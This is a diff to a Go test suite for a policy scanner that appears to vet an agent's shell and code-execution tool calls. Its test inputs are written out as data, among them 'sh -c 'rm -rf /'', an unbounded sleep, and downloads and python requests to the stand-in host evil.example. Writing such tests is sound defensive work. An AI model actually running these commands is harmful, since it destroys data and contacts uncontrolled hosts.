@@ -362,7 +362,32 @@ func TestRuleCorpus(t *testing.T) {
 			name:     "shell wrapper bypass",
 			input:    ScanInput{ToolName: "workspace_exec", Backend: BackendWorkspaceExec, Command: "sh -c 'rm -rf /'"},
 			decision: DecisionDeny,
-			mustHave: []string{"shell.wrapper", "command.dangerous_delete"},
+			// The raw-source dangerous-delete scan only runs on parse
+			// failure; a parsed wrapper call is denied via shell.wrapper
+			// and command.not_allowed instead.
+			mustHave: []string{"shell.wrapper"},
+		},
+		{
+			name:     "quoted dangerous delete literal is not a delete",
+			input:    ScanInput{ToolName: "workspace_exec", Backend: BackendWorkspaceExec, Command: `echo "rm -rf /"`},
+			decision: DecisionAllow,
+			mustNotHave: []string{
+				"command.dangerous_delete",
+			},
+		},
+		{
+			name:     "quoted privilege mention is not escalation",
+			input:    ScanInput{ToolName: "workspace_exec", Backend: BackendWorkspaceExec, Command: `echo "please su to root"`},
+			decision: DecisionAllow,
+			mustNotHave: []string{
+				"host.privilege",
+			},
+		},
+		{
+			name:     "overflowing sleep literal is unbounded",
+			input:    ScanInput{ToolName: "workspace_exec", Backend: BackendWorkspaceExec, Command: "sleep 99999999999999999999"},
+			decision: DecisionDeny,
+			mustHave: []string{"resource.long_sleep"},
 		},
 		{
 			name:     "substitution bypass",
@@ -478,4 +503,61 @@ func TestRuleCorpus(t *testing.T) {
 	}
 	// Reference scannerWithCustom to keep it from being flagged unused.
 	_ = scannerWithCustom
+}
+
+// TestBuildAnalysis_ConfiguredNetworkCommandBareHost verifies that the
+// policy's configured network commands reach shell token classification:
+// a bare-host argument to a configured downloader that is not in the
+// built-in set must be extracted as a network target.
+func TestBuildAnalysis_ConfiguredNetworkCommandBareHost(t *testing.T) {
+	p := testPolicy(t)
+	p.Network.Commands = append(p.Network.Commands, "mydl")
+	a := buildAnalysis(ScanInput{
+		ToolName: "workspace_exec",
+		Backend:  BackendWorkspaceExec,
+		Command:  "mydl evil.example/x",
+	}, p)
+	found := false
+	for _, nt := range a.NetworkTargets {
+		if nt.Host == "evil.example" {
+			found = true
+		}
+	}
+	require.True(t, found,
+		"bare-host argument to a configured downloader must be a network target; targets=%+v",
+		a.NetworkTargets)
+}
+
+// TestCodeRuleFindings_NetworkCallHonorsAllowlist verifies that a code
+// block whose extracted URLs are all allowlisted does not produce a
+// code.network_call finding, while a non-allowlisted URL still does.
+func TestCodeRuleFindings_NetworkCallHonorsAllowlist(t *testing.T) {
+	p := testPolicy(t)
+	scanner := NewScanner(p)
+
+	allowReport, err := scanner.Scan(context.Background(), ScanInput{
+		ToolName: "execute_code",
+		Backend:  BackendCodeExec,
+		CodeBlocks: []CodeBlock{{
+			Language: "python",
+			Code:     `requests.get("https://github.com/org/repo")`,
+		}},
+	})
+	require.NoError(t, err)
+	require.False(t, ruleIDSet(allowReport.Findings)["code.network_call"],
+		"allowlisted URL must not trigger code.network_call; findings=%+v",
+		allowReport.Findings)
+
+	denyReport, err := scanner.Scan(context.Background(), ScanInput{
+		ToolName: "execute_code",
+		Backend:  BackendCodeExec,
+		CodeBlocks: []CodeBlock{{
+			Language: "python",
+			Code:     `requests.get("https://evil.example/x")`,
+		}},
+	})
+	require.NoError(t, err)
+	require.True(t, ruleIDSet(denyReport.Findings)["code.network_call"],
+		"non-allowlisted URL must trigger code.network_call; findings=%+v",
+		denyReport.Findings)
 }
